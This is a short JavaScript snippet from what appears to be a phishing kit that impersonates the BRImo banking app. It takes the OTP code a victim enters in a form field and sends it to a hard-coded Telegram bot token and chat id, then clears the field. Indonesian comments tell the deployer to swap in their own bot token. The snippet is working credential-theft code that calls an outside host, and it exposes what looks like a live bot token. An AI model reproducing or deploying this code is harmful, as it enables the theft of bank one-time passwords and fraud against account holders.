
function kirimPesan1(event){
  event.preventDefault();

    var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;

var token = '7579282822:AAF88X0hvLsNSt1MTdclMuGbQymuhnU6X2s'; // Ganti dengan token bot yang kamu buat
    var grup = '6280047318'; // Ganti dengan chat id dari bot yang kamu buat    

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
   success: function(){
     
     
 document.getElementById("blinkotp").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
    setTimeout(function(){


    }, 1000);}});};